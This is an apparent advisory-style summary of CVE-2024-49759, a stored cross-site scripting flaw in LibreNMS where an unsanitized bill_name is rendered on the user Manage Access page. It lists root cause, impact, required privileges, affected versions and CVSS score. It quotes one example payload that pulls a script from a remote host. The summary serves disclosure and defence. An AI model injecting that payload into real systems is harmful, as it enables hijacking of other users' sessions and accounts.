The provided content relates to CVE-2024-49759.

**Root cause of vulnerability:**
- The root cause is the lack of proper sanitization of the `bill_name` parameter when creating a new bill. This allows an attacker to inject malicious JavaScript code.

**Weaknesses/vulnerabilities present:**
- Stored Cross-Site Scripting (XSS) vulnerability in `librenms/includes/html/pages/edituser.inc.php`.
- The `bill_name` parameter is not properly sanitized before being displayed in the "Bill Access" dropdown on the user's "Manage Access" page.

**Impact of exploitation:**
- An attacker can execute arbitrary JavaScript code in the context of other users' sessions.
- This can lead to unauthorized actions or compromise user accounts.
- Could result in loss of confidentiality, integrity and availability of the system.

**Attack vectors:**
- Network. An attacker can inject the malicious payload via HTTP requests.

**Required attacker capabilities/position:**
- The attacker needs to be an authenticated user with the ability to create a new bill.
- The attacker must have privileges to create bills.
- User interaction is required when another user views the "Manage Access" page.

**More Details:**
- The vulnerability is triggered in the `edituser.inc.php` file, specifically where the `bill_name` is displayed in an `<option>` tag.
- The vulnerability is present in versions <= 24.9.1 of LibreNMS, and patched in version 24.10.0
- An example payload is given as `test1'"><script/src=//15.rs>`, which uses a remote script to bypass length restrictions.
- A sample HTTP POST request demonstrating how to inject the payload is provided.
- The vulnerability has a CVSS v3 score of 7.5 (High) with the vector string CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L.
